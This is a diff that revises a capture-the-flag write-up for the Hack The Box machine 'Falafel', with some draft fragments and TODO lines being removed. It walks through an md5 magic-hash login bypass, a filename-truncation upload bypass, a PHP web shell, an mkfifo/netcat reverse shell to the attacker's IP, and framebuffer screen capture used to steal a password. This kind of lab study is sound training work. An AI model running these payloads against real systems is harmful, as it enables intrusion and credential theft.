@@ -14,17 +14,17 @@ The hack the box machine "Falafel" is a hard machine which is included in [TJnul
 By enumerating the target, it is possible to discover 
 
 # Exploitation
-We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 
+We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.73`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we see SSH on port 22 and a web server on port 80.
 
 ![nmap](/assets/{{ imgDir }}/nmap.png)
 
-If we navigate to the web server, we are met with the page below. It doesn't contain much except or a link to a login page and a link "Home" leading to the page we are already on. The login page has the extension `.php` meaning that we are dealing with a php application.
+If we navigate to the web server in a browser, we are met with the page below. It doesn't contain much except for a login button which leads to a login page and a link named "Home" which leads to the page we are already on. Since the link to the login page [http://10.10.10.73/login.php](http://10.10.10.73/login.php) has the extension `.php`, we know that we are dealing with a PHP application.
 
 ![indexPHP](/assets/{{ imgDir }}/indexPHP.png)
 
 ![loginPHP](/assets/{{ imgDir }}/loginPHP.png)
 
-We can use ffuf to guess directory and file names, as shown below. We specify the target host with the `-u` flag, specify file extensions with the `-e` flag, choose a wordlist using the `-w` flag and set the `-ic` flag to instruct the tool to ignore comments in the wordlist file.
+We can use [ffuf](https://github.com/ffuf/ffuf) to guess directory and file names, as shown below. We specify the target host with the `-u` flag, specify file extensions with the `-e` flag, choose a wordlist using the `-w` flag and set the `-ic` flag to instruct the tool to ignore comments in the wordlist file.
 
 {% highlight none linenos %}
 kali@kali:/tmp/x$ @@ffuf -u http://10.10.10.73/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt@@
@@ -75,23 +75,30 @@ server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
 {% endhighlight %}
 cyberlaw.txt
 
-Visiting all the 302 results in login page
-style.php - Contains styling for the website. Probably, this file is included in other php files to style every page of the website. header.php and footer.php contains the header of the website and is also included in all php files
+Visiting all the pages which resulted in a `302 Found`, results in a redirect to the login page. Out of the remaining pages, we can ignore anything that results in a `403 Forbidden` or has a size of 0 bytes. The `header.php` and `footer.php` pages contain the header and footer of the website. These two PHP pages are not meant to be loaded on their own. Rather, they are meant to be included in other PHP pages. Similarly, the `style.php` file contains styling for the website and is a file which is used by other PHP files. Furthermore, visiting the `robots.txt` page does not result in any interesting information about any hidden directories or files.
 
-Visiting robots.txt provides no interesting information about any hidden directories or files.
-We are also not interested in any 200 OK with 0 bytes (connction.php).
+There are two pages left that could be interesting to us. The first one is `cyberlaw.txt` since it resulted in a `200 OK` and contains data. The second one is `upload.php` since the name suggests that it allows users to upload files, meaning that we could potentially use this page to obtain RCE. However, we would first need to have access to a valid account to access this functionality.
 
-403 is forbidden => not interesting
-
-In conclusion, there are two files left that are interesting to us. The first is cyberlaw.txt since it resulted in a 200 ok and contains data. The second is upload.php since the name suggests that it allows users to upload files, meaning that we could potentially use this page to obtain RCE. However, we would first need to have access to a valid account to access this functionality.
-
-Navigating to [10.10.10.73/cyberlaw.txt](10.10.10.73/cyberlaw.txt) results in the page below. This page contains an email stating that there is a known problem with the authentication of the website and that there is an issue with a file upload feature which might lead to remote code execution on the target. In addition, it informs us that `admin` and `chris` might be valid usernames.
+Navigating to [http://10.10.10.73/cyberlaw.txt](http://10.10.10.73/cyberlaw.txt) results in the page below. This page contains an email stating that there is a known problem with the authentication of the website and that there is an issue with a file upload feature which might lead to remote code execution on the target. In addition, it informs us that `admin` and `chris` might be valid usernames.
 
 ![cyberLawTXT](/assets/{{ imgDir }}/cyberLawTXT.png)
 
-TODO: Background on php type juggling.
+Since we know that the web application is a PHP application and that authentication mechanisms typically check if a set of credentials equals another set of credentials, we could investigate if the authentication mechanism is vulnerable to type juggling attacks. A type juggling vulnerability occurs when a loose comparision `==` is performed when a strict comparision `===` should have been used. The difference is that loose comparisions will sometimes make PHP cast one of the parameters which it should compare, to another data type. For example, if we try to loosely compare a string with the integer `0`, the result is `true`. However, if we perform this comparision as a strict comparision, the result is `false`. A more detailed explanation of the differences between loose and strict comparisions can be found in [the official PHP documentation](https://www.php.net/manual/en/types.comparisons.php). 
 
-Trying to login with "admin" and "240610708" results in a successful login! We can strongly suspect that the authentication check looks something like md5(password) == "0e..."
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@php -a@@
+Interactive mode enabled
+
+php > @@var_dump("test"==0);@@
+bool(@@@true@@@)
+php > @@var_dump("test"===0);@@
+bool(@@@false@@@)
+{% endhighlight %}
+
+It is common for authentication mechanism to hash a provided password and compare the resulting password hash with a password hash stored in a database. If this is done using loose comparision, there is a risk that the comparision would evaluate to `true` for different passwords. This can occur if PHP tries to convert the password hashes to a [float]() before comparing them. This typically happens when the strings to compare start with one or more `0` characters, the character `e` followed by one or more numeric characters. For example, `0e1234`  would be interpreted as a float representing the value `0`. Similarly, `00000e1234` would also be interpreted as a float representing the value `0`. As such, comparing these two strings would result in `true`.
+
+A hash which PHP would interpret as a `0` float is normally called a [magic hash](). The table below lists magic hashes for different hash algorithms together with the input to these hash algorithms. Assuming that the password hash of one of our two compromised users is a magic hash and that the authentication check is performed using a loose comparision between a calculated password hash and an already known password hash, we could potentially be able to authenticate as this user by using one of the values in the `Input` column as a password.
 
 <div style="overflow-x:auto;">
 <table class="customTable"><tr><th>Hash Type</th><th>Hash Length</th><th>Input</th><th>Magic Hash</th></tr>
@@ -102,14 +109,17 @@ Trying to login with "admin" and "240610708" results in a successful login! We c
 </table>
 </div>
 
-We have the usernames chris and admin. We can try to log in with each password in the Input field of the table for each account. Upon doing this, it is possible to notice that we can log in with the username admin and password "240610708".
-
 ![adminLogin](/assets/{{ imgDir }}/adminLogin.png)
 
-What has happened is probably that the authentication portion of the code has an if clause like `passwordHash == md5(receivedPassword)` where passwordHash is the stored password hash for the admin user and receivedPassword is the password we provided. If `passwordHash` can be casted to a float with a numeric value of `0`, we will pass the check since we know that `md5(receivedPassword)` becomes `0e462097431906509019562988736854` and loose comparision is used. For example, if we assume that `passwordHash` is `0e12345678123456781234567812345678`, the comparision would result in `true`, as can be seen below.
+We have the usernames chris and admin. We can use the [http://10.10.10.73/login.php](http://10.10.10.73/login.php) page to try to authenticate with one of the usernames `chris` and `admin` together with a password in the `Input` field of the table. Upon trying each of these combinations, it is possible to notice that we can successfully log in with the username `admin` and password "240610708"! This leads us to the upload page below.
+
+![loginSuccess](/assets/{{ imgDir }}/loginSuccess.png)
+
+What has happened is that the authentication portion of the code uses a loose comparision with the format `storedPasswordHash == md5(receivedPassword)` where `storedPasswordHash` is the stored password hash for the admin user and `receivedPassword` is the password we provided. If `storedPasswordHash` can be casted to a float with a numeric value of `0`, we would pass the authentication check since we know that `md5(receivedPassword)` becomes `0e462097431906509019562988736854` and loose comparision is used. For example, if we assume that `storedPasswordHash` is `0e12345678123456781234567812345678`, the comparision would result in `true`, as can be seen below.
 
 {% highlight none linenos %}
-kali@kali:/tmp/x$ @@php -a@@
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@php -a@@
 Interactive mode enabled
 
 php > @@var_dump("0e12345678123456781234567812345678"=="0e462097431906509019562988736854");@@
@@ -117,71 +127,65 @@ bool(@@@true@@@)
 php > 
 {% endhighlight %}
 
-![loginSuccess](/assets/{{ imgDir }}/loginSuccess.png)
-
-We can start a python server by executing `python3 -m http.server 80
-` and try to upload files
-
-{% highlight none linenos %}
+{% highlight php linenos %}
 <?php $cmd = system($_REQUEST["cmd"]); ?>
 {% endhighlight %}
 
+The `Upload` page let's a user submit a URL to a file which the target then uses to download this file. We can start a Python web server by executing `python3 -m http.server 80` and try to trick the target into downloading malicious files from this web server. For example, we could try to trick it into downloading the PHP web shell shown above.
+
 {% highlight none linenos %}
-kali@kali:/tmp/x$ echo '<?php $cmd = system($_REQUEST["cmd"]); ?>' > webShell.php
-kali@kali:/tmp/x$ sudo python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@echo '<?php $cmd = system($_REQUEST["cmd"]); ?>' > webShell.php@@
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo python3 -m http.server 80@@
+@@@Serving HTTP on 0.0.0.0 port 80@@@ (http://0.0.0.0:80/) ...
 {% endhighlight %}
 
-
-http://10.10.16.7/webShell.php
+Once our Python web server has started, we go back to the browser and submit the URL `http://[IP]/webShell.php`, where `[IP]` is the our IP. Upon submitting this URL, we are informed that the file we are linking to has a bad extension.
 
 ![badExtension](/assets/{{ imgDir }}/badExtension.png)
-mv webShell.php webShell.php.png
+
+We can execute `mv webShell.php webShell.php.png` to append the extension `.png` to our web shell. If we submit a URL to this file, the target successfully downloads it, meaning that `.png` is an allowed extension. We can also see what command the target host executed to download the file. We can conclude that the target uses the `wget` tool to download files. 
 
 ![uploadPNG](/assets/{{ imgDir }}/uploadPNG.png)
 
-However, if we rename the file to 250 `A` characters followed by `.png` and try to reupload it, we can see that the upload is successful but that the filename was truncated since it was too long.
-
-mv webShell.php.png AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png
-
-![tooLong](/assets/{{ imgDir }}/tooLong.png)
-The new filename is not shown since it is too long to be rendered properly. However, we can see it by inspecting the source of the page or by inspecting the response in a proxy tool such as BrupSuite, as shown below. 
-
-![tooLongName](/assets/{{ imgDir }}/tooLongName.png)
-
-By counting the number of characters in the new file name, we can conclude that the length limit is 236 characters and that any filename longer than that will be truncated at this limit. As such, we can try to upload a file with a name that consists of 232 `A` characters followed by `.php.png`. This should pass the extension filter but save the file with the extension `.php`.
-
-filename length limitation of 236 characters. If we look closely at the output, we can see that the last part of the filename is being truncated. This 
-
-
-We know that hte web root is /var/www/html
-We can see that the file was uploaded to x and should have the name AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
+The `wget` tool has a built-in limitation on filename lengths of 236 characters. If a filename is longer than 236, only the first 236 characters will be included in the filename. In addition, we can strongly suspect that the extension filter is applied before the file is downloaded to disk, since file upload filters are normally applied before a file is written to disk. As such, we can try to upload a file with a name that consists of 232 `A` characters followed by `.php.png`. This should pass the extension filter but save the file with the extension `.php`. If we submit a URL to this new file, we obtain the output below. 
 
 ![uploadWS](/assets/{{ imgDir }}/uploadWS.png)
 
-[http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd](http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd)
+From the output, we can see that the file was uploaded to the directory `/var/www/uploads/0318-1557_d779068805ae58df/` and with the original name except for the `.png` extension! We can verify that we have code execution by using the web shell to run a command such as `pwd`. This can be performed by visiting [http://10.10.10.73/uploads/0318-1557_d779068805ae58df/[232A].php?cmd=pwd](http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd) where `[232A]` should be 232 `A` characters. Upon visiting this link, the current directory is displayed.
 
 ![RCE](/assets/{{ imgDir }}/RCE.png)
 
-We can use the reverse shell payload below to acquire a shell.
+The next step is to obtain an interactive shell on the target rather than a web shell. We can do this by starting a listener and executing the reverse shell payload below.
 {% highlight none linenos %}
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.7 443 >/tmp/f
 {% endhighlight %}
 
+However, to prevent the web application from interpreting any special characters in the wrong way, we can URL-encode the payload. This can be performed using Burp Suite's Decoder tool as demonstrated below.
+
 ![urlEncode](/assets/{{ imgDir }}/urlEncode.png)
-%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%37%20%34%34%33%20%3e%2f%74%6d%70%2f%66
 
-We url-encode it, execute `nc -lvp 443` to start a netcat listener and execute it using the web shell. Once the server has processed the request, the server connects back to our listener and provides us with a shell, as can be seen below.
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo nc -lvp 443@@
+listening on [any] 443 ...
+10.10.10.73: inverse host lookup failed: Unknown host
+@@@connect to [10.10.16.7] from (UNKNOWN) [10.10.10.73] 60458@@@
+sh: 0: can't access tty; job control turned off
+$ @@whoami@@
+@@@www-data@@@
+{% endhighlight %}
 
-![shell](/assets/{{ imgDir }}/shell.png)
-
+Next, we execute `nc -lvp 443` to start a netcat listener and execute the URL-encoded payload using the web shell. Once the server has processed the request, the server connects back to our listener and provides us with a shell as the `www-data` user, as can be seen above. The next step is to escalate our privileges!
 
 # Privilege Escalation
 
 <!-- ffmpeg -vcodec rawvideo -f rawvideo -pix_fmt rgb565 -s 1176x885 -i fb0.raw -f image2 -vcodec mjpeg -frames:v 1 out-buffer.jpg -->
-
+When we were uploading files, we discovered that the web server root was `/var/www/html`. Now that we have a shell as `www-data`, we can list files in this directory and read their content. One of the files in this directory is `connection.php` which contains credentials for connecting to a database.
 {% highlight none linenos %}
-$ @@ls ../..@@
+$ @@ls /var/www/html@@
 assets
 authorized.php
 @@@connection.php@@@
@@ -217,6 +221,8 @@ $ @@cat ../../connection.php@@
 $ 
 {% endhighlight %}
 
+When we were scanning the target with nmap, we discovered that SSH was available on port 22. We can attempt to login with the database credentials as demonstrated below.
+
 {% highlight none linenos %}
 kali@kali:~$ @@ssh moshe@10.10.10.73@@
 moshe@10.10.10.73's password: 
@@ -231,25 +237,42 @@ Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)
 
 
 Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
-$ @@groups@@
-moshe adm mail news voice floppy audio @@@video@@@ games
+$
 {% endhighlight %}
 
-If we execute `w`, we see that the `yossi` user is currently physically active on the target host. We
+Luckily, the database credentials work and we obtain a shell as the `moshe` user. If we execute `w`, we see that the `yossi` user is currently physically active on the target host. By executing `groups`, we can list the groups of the `moshe` user and discover that we are part of the `video` group. The video group normally has access to video devices and memory segments of these devices. For example, this includes framebuffers which are portions of RAM that contains the next frame which should be displayed on a physical monitor. If the `yossi` user is physically present in front of the computer, we might be able to take a screenshot of his screen to see what he is doing.
 
 {% highlight none linenos %}
 $ @@w@@
  19:56:03 up 13 min,  2 users,  load average: 0.07, 0.02, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 @@@yossi@@@    tty1                      19:42   13:38   0.07s  0.06s -bash
-moshe    pts/0    10.10.16.3       19:56    2.00s  0.00s  0.00s w
+moshe    pts/0    10.10.16.7       19:56    2.00s  0.00s  0.00s w
+$ @@groups@@
+moshe adm mail news voice floppy audio @@@video@@@ games
+$
+{% endhighlight %}
+
+In Linux, there is one framebuffer for each monitor and each framebuffer is normally represented by [character device]() in the `/dev/` directory. They are normally named `fb[x]`, where `[x]` is the index of the framebuffer starting at `0`. If we try to list all framebuffers on the target, we discover that there only is one framebuffer and that we have access to it!
+
+{% highlight none linenos %}
 $ @@ls -l /dev/fb*@@
 crw-rw---- 1 root @@@video@@@ 29, 0 May  1 19:42 @@@/dev/fb0@@@
+$
+{% endhighlight %}
+
+<!-- TODO: It is a [character device] which makes it easy for software to interact with the video hardware. -->
+
+We can extract a frame from the framebuffer by copying the content of the framebuffer to a file, as demonstrated below. In addition, we can obtain the screen resolution by reading the content of the file `/sys/class/graphics/fb0/virtual_size`. This will be useful later on when we try to convert this frame to an image format which we can display.
+
+{% highlight none linenos %}
 $ @@cat /dev/fb0 > /tmp/screenshot.raw@@
 $ @@cat /sys/class/graphics/fb0/virtual_size@@
 @@@1176,885@@@
 $
 {% endhighlight %}
+
+Once we have extracted a frame and saved it into `/tmp/screenshot.raw`, we can download the file using `scp`.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -261,13 +284,13 @@ moshe@10.10.10.73's password:
 └─$ 
 {% endhighlight %}
 
-{% highlight none linenos %}
-{% endhighlight %}
+We can use ffmpeg to convert the captured frame to an displayable image format such as `JPEG`. We do this by executing `ffmpeg -pix_fmt [pixelFormat] -s 1176x885 -f rawvideo -i screenshot.raw -f singlejpeg screenshot.jpg` where `[pixelFormat]` is the [pixel format](https://en.wikipedia.org/wiki/Pixel_Format) we want. A pixel format defines how a sequence of bits should be group into pixels. For example, it could define that each pixel is represented by 8 bits for each of the three colors red, green and blue.
 
-TODO: Background of frame buffer
-It is a [character device] which makes it easy for software to interact with the video hardware.
+The `-s` flag is used to specify the width and height of the frame. Then, we use the `-f` and `-i` flags to point `ffmpeg` to the `screenshot.raw` file and instruct it that this file is in the `rawvideo` format. Thereafter, we use the `-f` flag again to specify that the output file should be a `JPEG` file. Note that we use the `-f` flag twice since it only applies to the subsequent file which is specified as an argument to `ffmpeg`.
 
-We can use ffmpeg to convert the captured image from the frame buffer. We do this by executing `ffmpeg -pix_fmt [pixelFormat] -s 1176x885 -f rawvideo -i fb0.raw -f singlejpeg screenshot.jpg` where [pixelFormat] is the pixel format we want. TODO: Explain flags
+The only thing the command is missing is the pixel format. We can list all available pixel formats using the `-pix_fmts` flag, as demonstrated below.
+
+<!-- It is also possible to this with gimp or with custom code. -->
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -311,16 +334,14 @@ IO... rgba                   4            32
 [...]
 {% endhighlight %}
 
-This results in a set of images which are shown in the video below. 
+Since we don't know which one to use, we can execute the command once for each pixel format. This results in a set of images which are shown in the video below. 
 
 <video width="100%" controls="controls">
   <source src="/assets/{{ imgDir }}/pixelFormats.mp4" type="video/mp4">
 </video>
 
 
-We use the -f flag twice. Once for the input file and once for the output file
-
-It is also possible to this with gimp or with custom code.
+One of the pixel formats which results in a clear picture is `0rgb`. Generating a `JPEG` using this pixel format can be performed as demonstrated below.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -359,11 +380,11 @@ video:46kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing ov
 └─$ @@xdg-open screenshot.jpg@@
 {% endhighlight %}
 
-Internally, we see that the tool converts the frame buffer data to a mjpeg format. Then, it uses this data to create a single jpg file.
+From the output of the commnad, we can see that the tool converts the frame to the `mjpeg` format. Then, it uses this data to create a single `JPEG` image which is saved in a file named "screenshot.jpg". If we open this file using `xdg-open`, we see that the `Yossi` user is trying to use the `passwd` command to change the password of his account. The first time, however, he mistakenly typed his password in cleartext. Although we can't see what password he set in his successful attempt, we can strongly suspect that it is `MoshePlzStopHackingMe!`.
 
 ![screenshot](/assets/{{ imgDir }}/screenshot.png)
 
-We see that the yossi user attempted to change password to `MoshePlzStopHackingMe!`
+We can attempt to authenticate as `Yossi` over SSH using this password. Upon doing so, we discover that the password is correct and that we obtain a shell as `Yossi`!
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -384,6 +405,8 @@ yossi@falafel:~$ @@groups@@
 yossi adm @@@disk@@@ cdrom dip plugdev lpadmin sambashare
 yossi@falafel:~$
 {% endhighlight %}
+
+If we check the groups of the `yossi` user, we discover that this user is a member of the `disk` group. This is interesting since the disk group can read any files on the hard drive. We could use this to read sensitive files which could, for example, contain credentials for the `root` user.
 
 {% highlight none linenos %}
 yossi@falafel:~$ @@df@@
@@ -438,4 +461,170 @@ Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
 {% endhighlight %}
 
 {% highlight none linenos %}
+{% endhighlight %}
+
+# Extra - Understanding the Type Juggling Vulnerability
+
+{% highlight none linenos %}
+$ @@cd /var/www/html@@
+$ @@ls@@
+assets
+authorized.php
+connection.php
+css
+cyberlaw.txt
+footer.php
+header.php
+icon.png
+images
+index.php
+js
+@@@login.php@@@
+@@@login_logic.php@@@
+logout.php
+profile.php
+robots.txt
+style.php
+upload.php
+uploads
+$ @@cat login.php@@
+@@@<?php include("login_logic.php"); ?>@@@
+<!DOCTYPE html>
+<html> 
+<head>
+    <title>Falafel Lovers - Login Page</title>
+    <?php include('style.php');?>    
+</head>
+<body>
+<?php include('header.php');?>
+  <div class="login">
+    <h1>Login</h1>                                        
+    <form action = "" method = "post">
+        <label>Username  :</label><input type = "text" name = "username" class = "box"/><br /><br />
+        <label>Password  :</label><input type = "password" name = "password" class = "box" /><br/><br />
+        <button type="submit" class="btn btn-primary btn-block btn-large">Sumbit</button>
+    </form>               
+        <br>   
+        <?php echo $message;?>
+        </br>
+   </body>
+<?php include('footer.php');?>
+</html>$ 
+$ cat login_logic.php
+<?php
+  include("connection.php");
+  session_start();
+  if($_SERVER["REQUEST_METHOD"] == "POST") {
+    if(!isset($_REQUEST['username'])&&!isset($_REQUEST['password'])){
+      //header("refresh:1;url=login.php");
+      $message="Invalid username/password.";
+      //die($message);
+      goto end;
+          }
+
+    $username = $_REQUEST['username'];
+    $password = $_REQUEST['password'];
+
+    if(!(is_string($username)&&is_string($password))){
+      //header("refresh:1;url=login.php");
+      $message="Invalid username/password.";
+      //die($message);
+      goto end;
+    }
+
+    $password = md5($password);
+    $message = "";
+    if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){
+      $message="Hacking Attempt Detected!";
+      //die($message);
+      goto end;
+    }
+
+    $sql = "SELECT * FROM users WHERE username='$username'";
+    $result = mysqli_query($db,$sql);
+    $users = mysqli_fetch_assoc($result);
+    mysqli_close($db);
+    if($users) {
+      if($password == $users['password']){
+        if($users['role']=="admin"){         
+          $_SESSION['user'] = $username;
+          $_SESSION['role'] = "admin";
+          header("refresh:1;url=upload.php");
+          //die("Login Successful!");
+          $message = "Login Successful!";
+        }elseif($users['role']=="normal"){
+                                  $_SESSION['user'] = $username;
+                                  $_SESSION['role'] = "normal";
+          header("refresh:1;url=profile.php");
+                                  //die("Login Successful!");
+          $message = "Login Successful!";
+        }else{
+          $message = "That's weird..";
+        }
+      }
+      else{
+        $message = "Wrong identification : ".$users['username'];
+      }
+    }
+    else{
+      $message = "Try again..";
+    }
+    //echo $message;
+  }
+  end:
+?>
+$ 
+{% endhighlight %}
+
+{% highlight none linenos %}
+$ @@mysql -umoshe -pfalafelIsReallyTasty@@
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4
+Server version: 5.7.21-0ubuntu0.16.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> @@show databases;@@
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| @@@falafel@@@            |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> @@use falafel@@
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> @@select table_schema,table_name from information_schema.tables;@@
++--------------------+---------------------------------------+
+| table_schema       | table_name                            |
++--------------------+---------------------------------------+
+| information_schema | CHARACTER_SETS                        |
+| information_schema | COLLATIONS                            |
+[...]
+| information_schema | INNODB_SYS_TABLESTATS                 |
+| @@@falafel@@@            | @@@users@@@                                 |
++--------------------+---------------------------------------+
+62 rows in set (0.00 sec)
+
+mysql> @@select * from users;@@
++----+----------+----------------------------------+--------+
+| ID | username | password                         | role   |
++----+----------+----------------------------------+--------+
+|  1 | @@@admin@@@    | @@@0e462096931906507119562988736854@@@ | admin  |
+|  2 | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | normal |
++----+----------+----------------------------------+--------+
+2 rows in set (0.00 sec)
+
+mysql> 
 {% endhighlight %}
